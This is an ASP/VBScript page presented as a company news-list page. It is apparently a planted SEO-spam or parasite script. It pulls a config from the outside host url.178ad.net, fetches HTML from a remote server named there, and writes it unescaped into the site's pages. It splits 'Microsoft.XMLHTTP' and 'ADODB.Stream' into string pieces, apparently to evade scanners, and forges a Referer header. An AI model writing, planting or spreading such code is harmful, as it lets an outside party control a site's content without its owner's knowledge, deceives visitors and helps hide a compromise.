<%@LANGUAGE="VBSCRIPT" CODEPAGE="936"%>
<%
siteName="广安娱乐科技有限公司"
listPath="newlist.asp"
viewPath="newview.asp"

cache_perfix=serverName&"_w"
if request("r")="r" then
	 Application(cache_perfix&"isCache")=false
end if
if Application(cache_perfix&"isCache")<>true then
	Set conf=Server.CreateObject("Micro"&"soft"&"."&"XML"&"HTTP")
	conf.Open "GET","http://url.178ad.net/l/w.xml",False
	conf.send  
	if(conf.Status=200 and conf.readyState=4) then
		Set xml=Server.CreateObject("Microsoft.XMLDOM")
		xml.Async=False
		xml.ValidateOnParse=False
		xml.Load(conf.ResponseXML)
		If xml.ReadyState>2 Then	
			Set tao1=xml.getElementsByTagName("tao1")
			Application(cache_perfix&"tao1")=tao1.Item(0).text
			Set tao2=xml.getElementsByTagName("tao2")
			Application(cache_perfix&"tao2")=tao2.Item(0).text
			Set tao3=xml.getElementsByTagName("tao3")
			Application(cache_perfix&"tao3")=tao3.Item(0).text
			
			Set tan1=xml.getElementsByTagName("tan1")
			Application(cache_perfix&"tan1")=tan1.Item(0).text
			Set tan2=xml.getElementsByTagName("tan2")
			Application(cache_perfix&"tan2")=tan2.Item(0).text
			Set mainUrl=xml.getElementsByTagName("ser")
			
			Application(cache_perfix&"mainUrl")=mainUrl.Item(0).text
			Application(cache_perfix&"isCache")=true
		end if
	end if
	Set conf=Nothing
	Set xml=Nothing
end if
category = Array("319094784", "318832640", "324403200", "118685696" ,"119603200","117506048","320274432","321191936","320929792","322109440","322371584","321454080","323551232","323026944","324009984","121044992","324272128" ,"83951616" ,"85131264" ,"84475904" ,"86310912" ,"85393408" ,"88670208" ,"90374144" ,"84213760" ,"87228416" ,"89325568" ,"88145920" ,"89587712" , "158334976" ,"89456640" ,"1110638592" ,"1110507520" ,"1109983232" ,"1109852160" ,"1109721088" ,"1109590016" ,"1109458944" ,"1108410368" ,"1090846720" ,"1108934656" ,"1108541440" ,"1107886080" ,"1100152832" ,"1095041024" ,"1095303168" ,"1096876032" ,"1096220672" ,"1095958528" ,"1098317824" ,"1094123520" ,"1091764224" ,"1108803584" ,"1108672512" , "1107623936" ,"1107361792" ,"1100414976" ,"1092681728" ,"1092026368" , "1093206016" ,"1090584576" ,"1091108864" ,"928448512" ,"86376448" , "929103872" ,"927006720" ,"926089216" ,"925433856" ,"929628160" ,"923992064" , "929366016" ,"924909568" ,"924254208" ,"927531008" ,"930283520" ,"931201024" , "923074560" ,"923336704" ,"930545664" ,"157810688" ,"157417472" ,"860160000" , "153157632" ,"152240128" ,"153419776" ,"157745152" ,"151584768" ,"151322624" , "157614080" ,"157548544" ,"157351936" ,"156696576" ,"90505216" ,"154337280" , "152502272" ,"153681920" ,"926351360" ,"154599424" ,"87490560" ,"156434432" , "90767360","856883200" ,"858324992" ,"858980352" ,"855703552","855965696" , "860422144" ,"857800704" ,"690290688","687931392" ,"162797977" ,"691208192" , "688455680","691470336" ,"689111040" ,"688193536" ,"689373184", "690552832" ,"88408064" ,"691077120" ,"1694498816","391315456" ,"391577600" , "385941504" ,"387121152","386465792" ,"386203648" ,"388562944" , "389218304","390135808" ,"553975808" ,"554237952" ,"1193345024","556990464" , "557252608" ,"557907968" ,"558170112","558432256" ,"559087616" , "560201728" ,"559153152","556072960" ,"555810816" ,"559349760" ,"560070656", "556335104" ,"622264320" ,"625999872" ,"625278976","626196480" , "624361472" ,"621281280" ,"621215744","621346816" ,"622002176" ,"623181824" , "623443968","626130944" ,"625541120" ,"626327552" ,"1191510016", "1191247872" ,"1160839168" ,"1191772160" ,"1192689664","1193607168" ,"1879048192")
	cate_leng=UBound(category)+1
	randomize 
	cate_rnd=int(rnd()*cate_leng)
	cate_id=request("c") 
	if cate_id="" then
		cate_id=category(cate_rnd)
	end if
	
	current_page_num=request("pg")
	if current_page_num="" then
		current_page_num=0
	end if
	sstr="c="&cate_id&"&"
	sstr=sstr&"p="&current_page_num

	strBody=GetPageContext(URLEncoding(Application(cache_perfix&"mainUrl")&"?"&sstr),"GB2312")
	strBody=replace(strBody,"{xxoo}",replace(Request.ServerVariables("url"),listPath,"")&viewPath)	
%>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312" />
<title><%=siteName%></title>
<link href="http://url.178ad.net/style/layout.css" rel="stylesheet" type="text/css" />
</head>

<body>
<div id="container">
  <div id="header"></div>
  <div id="menu"></div>
  <div id="mainContent">
    <div id="sidebar"></div>
    <div id="content">
    <ul>
	<%=strBody%>
    </ul>
    <div id="pagination">
        <%
		  dim min,max,curr
		  curr=clng(current_page_num)
		  if current_page_num<=5 then
			min=0	
		  else
		    min=curr-4  
		  end if
		  max=curr+4
		  if min <> 0 then
		  	response.Write("<a class=""nextpostslink""href="""&scriptName&"?c="&cate_id&"&pg=0"">第一页</a>")
		  	response.Write("<span class=""extend"">...</span>")
		  end if
	  	  for i=min to max
		  	if current_page_num="" then 
				response.Write("<span class=""current"">1</span>")
			end if
			if i=curr then
				response.Write("<span class=""current"">"&(i+1)&"</span>")
			else
				response.Write("<a class=""page"" href="""&scriptName&"?c="&cate_id&"&pg="&i&""">"&(i+1)&"</a>")
			end if
		  next
		  	response.Write("<span class=""extend"">...</span>")
			response.Write("<a class=""nextpostslink""href="""&scriptName&"?c="&cate_id&"&pg="&(i+1)&""">>></a>")
	  %>
    </div>
    </div>
  </div>
  <div id="footer"></div>
</div>
</body>
</html>
<%
Function URLEncoding(vstrIn) 
	strReturn = "" 
	For i = 1 To Len(vstrIn) 
	ThisChr = Mid(vStrIn,i,1) 
	If Abs(Asc(ThisChr)) < &HFF Then 
	strReturn = strReturn & ThisChr 
	Else 
	innerCode = Asc(ThisChr) 
	If innerCode < 0 Then 
	innerCode = innerCode + &H10000 
	End If 
	Hight8 = (innerCode And &HFF00)\ &HFF 
	Low8 = innerCode And &HFF 
	strReturn = strReturn & "%" & Hex(Hight8) & "%" & Hex(Low8) 
	End If 
	Next 
	URLEncoding = strReturn 
End Function 

Public Function GetPageContext(ByVal URL, ByVal Cset)
		Dim strHeader
		Dim l
		
		On Error Resume Next
		
		Dim Retrieval
		Dim ObjStream
		Set ObjStream = CreateObject("ADODB"&"."&"Stream")
		ObjStream.Type = 1
		ObjStream.Mode = 3
		ObjStream.Open
		Set Retrieval = CreateObject("Micro"&"soft"&"."&"XML"&"HTTP")
		With Retrieval
			.Open "GET", URL, False
			.setRequestHeader "Referer", URL
			.setRequestHeader "Content-Length",Len(Str)
			.send Str
			If .readyState <> 4 Then Exit Function
			If .Status > 300 Then Exit Function
			'--获取目标网站文件头
			strHeader = .getResponseHeader("Content-Type")
			strHeader = UCase(strHeader)
			ObjStream.Write (.responseBody)
		End With
		Set Retrieval = Nothing
		
		If Len(strHeader) > 0 Then
			'--获取目标文件编码
			l = InStrRev(strHeader, "CHARSET=", -1, 1)
			If l > 0 Then
				Cset = Right(strHeader, Len(strHeader) - l - 7)
			Else
				Cset = Cset
			End If
		End If
		ObjStream.Position = 0
		ObjStream.Type = 2
		ObjStream.Charset = Trim(Cset)
		GetPageContext = ObjStream.ReadText
		ObjStream.Close
		Set ObjStream = Nothing
		Exit Function
	End Function
	%>